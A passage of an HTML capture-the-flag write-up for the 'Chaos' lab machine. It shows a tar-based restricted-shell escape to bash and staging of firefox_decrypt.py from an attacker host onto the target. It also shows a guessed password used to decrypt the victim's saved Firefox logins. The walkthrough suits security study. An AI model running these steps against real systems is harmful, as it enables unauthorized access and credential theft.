+        This is a brilliant resource for escaping restricted shells - <a href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf">https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf</a><br>
+        <br>
+            <div class="codebox">
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>main<span style="color:#ff9d00;font-weight:700">/</span>J00_w1ll_f1Nd_n07H1n9_H3r3<span style="color:#ff9d00;font-weight:700">/</span>compile$&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">tar</span>&nbsp;cf&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null&nbsp;testfile&nbsp;--checkpoint=1&nbsp;--checkpoint-action=exec=<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/bash</span><br>
+                <span style="color:#ff9d00;font-weight:700">tar:</span>&nbsp;testfile<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Cannot&nbsp;<span style="color:#ff9d00;font-weight:700">stat:</span>&nbsp;No&nbsp;such&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;or&nbsp;directory<br>
+                <span style="color:#ff9d00;font-weight:700">bash:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;not&nbsp;found<br>
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>main<span style="color:#ff9d00;font-weight:700">/</span>J00_w1ll_f1Nd_n07H1n9_H3r3<span style="color:#ff9d00;font-weight:700">/</span>compile$&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                Command&nbsp;<span style="color:#3ad900;font-weight:400">'id'</span>&nbsp;is&nbsp;available&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;<span style="color:#3ad900;font-weight:400">'/usr/bin/id'</span><br>
+                The&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;could&nbsp;not&nbsp;be&nbsp;located&nbsp;because&nbsp;<span style="color:#3ad900;font-weight:400">'/usr/bin'</span>&nbsp;is&nbsp;not&nbsp;included&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;the&nbsp;PATH&nbsp;environment&nbsp;variable.<br>
+                <span style="color:#ff9d00;font-weight:700">id:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">command</span>&nbsp;not&nbsp;found
+            </div>
+        </div><br>
+        <br>
+        We have no commands, so set your $PATH variable so that we can have commands again.<br>
+            <div class="codebox">
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:/</span>home$&nbsp;<span style="color:#ff9d00;font-weight:700">export</span>&nbsp;<span style="color:#7f0044;font-weight:400">PATH</span>=<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">:/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">:/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">:/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">:/</span>sbin<span style="color:#ff9d00;font-weight:700">:/</span>bin<br>
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>main<span style="color:#ff9d00;font-weight:700">/</span>J00_w1ll_f1Nd_n07H1n9_H3r3<span style="color:#ff9d00;font-weight:700">/</span>compile$&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=1001<span style="color:#ff9d00;font-weight:700">(</span>ayush<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=1001<span style="color:#ff9d00;font-weight:700">(</span>ayush<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=1001<span style="color:#ff9d00;font-weight:700">(</span>ayush<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><br>
+        <br>
+        And get user.txt!<br>
+            <div class="codebox">
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>main<span style="color:#ff9d00;font-weight:700">/</span>J00_w1ll_f1Nd_n07H1n9_H3r3<span style="color:#ff9d00;font-weight:700">/</span>compile$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<br>
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:/</span>home$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;ayush<br>
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                mail&nbsp;&nbsp;user.txt<br>
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;user.txt<br>
+                eef39...
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) ayush privesc</strong></h2><br>
+            <div class="codebox">
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;~<br>
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;&nbsp;<br>
+                total&nbsp;40K<br>
+                drwx------&nbsp;6&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;May&nbsp;18&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>23&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;4&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Oct&nbsp;28&nbsp;&nbsp;2018&nbsp;..<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;2&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Oct&nbsp;28&nbsp;&nbsp;2018&nbsp;.app<br>
+                -rw-------&nbsp;1&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;Nov&nbsp;24&nbsp;23<span style="color:#ff9d00;font-weight:700">:</span>57&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;220&nbsp;Oct&nbsp;28&nbsp;&nbsp;2018&nbsp;.bash_logout<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;1&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;22&nbsp;Oct&nbsp;28&nbsp;&nbsp;2018&nbsp;.bashrc<br>
+                drwx------&nbsp;3&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;May&nbsp;18&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>11&nbsp;.gnupg<br>
+                drwx------&nbsp;3&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;May&nbsp;18&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>41&nbsp;mail<br>
+                drwx------&nbsp;4&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;.mozilla<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;807&nbsp;Oct&nbsp;28&nbsp;&nbsp;2018&nbsp;.profile<br>
+                -rw-------&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;&nbsp;33&nbsp;Oct&nbsp;28&nbsp;&nbsp;2018&nbsp;user.txt
+            </div>
+        </div><br>
+        <br>
+        <code>.mozilla</code> looks interesting :)<br>
+            <div class="codebox">
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;.mozilla&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.mozilla$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;*<br>
+                extensions<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;8.0K<br>
+                drwx------&nbsp;2&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;.<br>
+                drwx------&nbsp;4&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;..<br>
+                <br>
+                firefox<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;20K<br>
+                drwx------&nbsp;&nbsp;4&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;&nbsp;.<br>
+                drwx------&nbsp;&nbsp;4&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;&nbsp;..<br>
+                drwx------&nbsp;10&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;&nbsp;bzo7sjt1.default<br>
+                drwx------&nbsp;&nbsp;4&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Oct&nbsp;15&nbsp;&nbsp;2018&nbsp;<span style="color:#3ad900;font-weight:400">'Crash&nbsp;Reports'</span><br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;104&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;&nbsp;profiles.ini
+            </div>
+        </div><br>
+        <br>
+        <code>bzo7sjt1.default</code> is a firefox profile.<br>
+            <div class="codebox">
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.mozilla$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;firefox<br>
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.mozilla<span style="color:#ff9d00;font-weight:700">/</span>firefox$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;bzo7sjt1.default<br>
+                <br>
+                bzo7sjt1.default<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;15M<br>
+                drwx------&nbsp;10&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;.<br>
+                drwx------&nbsp;&nbsp;4&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;..<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;&nbsp;24&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;addons.json<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;222&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;AlternateServices.txt<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;559K&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;blocklist-addons.json<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;28K&nbsp;Oct&nbsp;&nbsp;7&nbsp;&nbsp;2018&nbsp;blocklist-gfx.json<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;136K&nbsp;Oct&nbsp;&nbsp;7&nbsp;&nbsp;2018&nbsp;blocklist-plugins.json<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;420K&nbsp;Oct&nbsp;25&nbsp;&nbsp;2018&nbsp;blocklist.xml<br>
+                drwx------&nbsp;&nbsp;2&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;bookmarkbackups<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;92K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;cert9.db<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;362&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;cert_override.txt<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;170&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;compatibility.ini<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;809&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;containers.json<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;224K&nbsp;Oct&nbsp;24&nbsp;&nbsp;2018&nbsp;content-prefs.sqlite<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;512K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;cookies.sqlite<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;32K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;cookies.sqlite-shm<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;cookies.sqlite-wal<br>
+                drwx------&nbsp;&nbsp;3&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;crashes<br>
+                drwx------&nbsp;&nbsp;3&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;datareporting<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;167&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;extensions.ini<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;5.6K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;extensions.json<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;192K&nbsp;Oct&nbsp;24&nbsp;&nbsp;2018&nbsp;formhistory.sqlite<br>
+                drwx------&nbsp;&nbsp;3&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;gmp<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;36K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;key4.db<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;1.3M&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;kinto.sqlite<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;570&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;logins.json<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;3.7K&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;mimeTypes.rdf<br>
+                drwx------&nbsp;&nbsp;2&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Oct&nbsp;25&nbsp;&nbsp;2018&nbsp;minidumps<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;.parentlock<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;96K&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;permissions.sqlite<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;868&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;pkcs11.txt<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;10M&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;places.sqlite<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;32K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;places.sqlite-shm<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;33K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;places.sqlite-wal<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;469&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;pluginreg.dat<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;12K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;prefs.js<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;43K&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;revocations.txt<br>
+                drwx------&nbsp;&nbsp;2&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Oct&nbsp;26&nbsp;&nbsp;2018&nbsp;saved-telemetry-pings<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;17K&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;search.json.mozlz4<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;SecurityPreloadState.txt<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;&nbsp;90&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;sessionCheckpoints.json<br>
+                drwx------&nbsp;&nbsp;2&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;sessionstore-backups<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;5.3K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;SiteSecurityServiceState.txt<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;5&nbsp;ayush&nbsp;ayush&nbsp;4.0K&nbsp;Oct&nbsp;&nbsp;9&nbsp;&nbsp;2018&nbsp;storage<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;512&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;storage.sqlite<br>
+                -rwx------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;&nbsp;29&nbsp;Sep&nbsp;29&nbsp;&nbsp;2018&nbsp;times.json<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;256K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;webappsstore.sqlite<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;32K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;webappsstore.sqlite-shm<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;webappsstore.sqlite-wal<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;ayush&nbsp;ayush&nbsp;1.1K&nbsp;Oct&nbsp;27&nbsp;&nbsp;2018&nbsp;xulstore.json<br>
+            </div>
+        </div><br>
+        <br>
+        The intersting files in here are <code>logins.json</code> and <code>key4.db</code>.<br>
+        <br>
+        <code>logins.json</code> contains encrypted logins and <code>key4.db</code> contains encrypted keys:<br>
+        <a href="https://support.mozilla.org/en-US/questions/1181061">https://support.mozilla.org/en-US/questions/1181061</a><br>
+        <br>
+        <a href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a> allows us to decrypt these files providing we know the master password.<br>
+        Considering this is ayush's firefox profile, we could take a guess that their master password might be the same as their user login password - <code>jiujitsu</code>.<br>
+        <br>
+        <code>wget</code> the <code>firefox_decrypt.py</code> python script to your attacking machine and server it to the target using SimpleHTTPServer:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>unode<span style="color:#ff9d00;font-weight:700">/</span>firefox_decrypt<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>firefox_decrypt.py<br>
+                --2019-05-18&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>33<span style="color:#ff9d00;font-weight:700">:</span>50--&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>unode<span style="color:#ff9d00;font-weight:700">/</span>firefox_decrypt<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>firefox_decrypt.py<br>
+                Resolving&nbsp;raw.githubusercontent.com&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">)</span>...&nbsp;151.101.16.133<br>
+                Connecting&nbsp;to&nbsp;raw.githubusercontent.com&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">)|</span>151.101.16.133<span style="color:#ff9d00;font-weight:700">|:</span>443...&nbsp;connected.<br>
+                HTTP&nbsp;request&nbsp;sent,&nbsp;awaiting&nbsp;response...&nbsp;200&nbsp;OK<br>
+                Length<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;34618&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>34K<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[text<span style="color:#ff9d00;font-weight:700">/</span>plain]<br>
+                Saving&nbsp;to<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;‘firefox_decrypt.py’<br>
+                <br>
+                firefox_decrypt.py&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%[=====================================&gt;]&nbsp;&nbsp;33.81K&nbsp;&nbsp;--.-KB<span style="color:#ff9d00;font-weight:700">/</span>s&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;0.05s&nbsp;&nbsp;&nbsp;<br>
+                <br>
+                2019-05-18&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>33<span style="color:#ff9d00;font-weight:700">:</span>51&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>724&nbsp;KB<span style="color:#ff9d00;font-weight:700">/</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;-&nbsp;‘firefox_decrypt.py’&nbsp;saved&nbsp;[34618<span style="color:#ff9d00;font-weight:700">/</span>34618]<br>
+                <br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                firefox_decrypt.py<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos<span style="color:#ff9d00;font-weight:700">/</span>exploits#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        firefox_decrypt.py wants a profile, so I changed directory into the .mozilla directory where the <code>bzo7sjt1.default</code> profile is<br>
+            <div class="codebox">
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.mozilla<span style="color:#ff9d00;font-weight:700">/</span>firefox$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                &nbsp;bzo7sjt1.default&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">'Crash&nbsp;Reports'</span>&nbsp;&nbsp;&nbsp;profiles.ini
+            </div>
+        </div><br>
+        <br>
+        <code>wget</code> firefox_decrypt.py from your attacking machine:<br>
+            <div class="codebox">
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.mozilla<span style="color:#ff9d00;font-weight:700">/</span>firefox$&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>unode<span style="color:#ff9d00;font-weight:700">/</span>firefox_decrypt<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>firefox_decrypt.py<br>
+                &lt;com<span style="color:#ff9d00;font-weight:700">/</span>unode<span style="color:#ff9d00;font-weight:700">/</span>firefox_decrypt<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>firefox_decrypt.py<br>
+                --2019-05-18&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>33<span style="color:#ff9d00;font-weight:700">:</span>43--&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>unode<span style="color:#ff9d00;font-weight:700">/</span>firefox_decrypt<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>firefox_decrypt.py<br>
+                Resolving&nbsp;raw.githubusercontent.com&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">)</span>...&nbsp;failed<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Temporary&nbsp;failure&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;name&nbsp;resolution.<br>
+                <span style="color:#ff9d00;font-weight:700">wget:</span>&nbsp;unable&nbsp;to&nbsp;resolve&nbsp;host&nbsp;address&nbsp;‘raw.githubusercontent.com’<br>
+                ayush@chaos<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>.mozilla<span style="color:#ff9d00;font-weight:700">/</span>firefox$&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.13.44<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>firefox_decrypt.py<br>
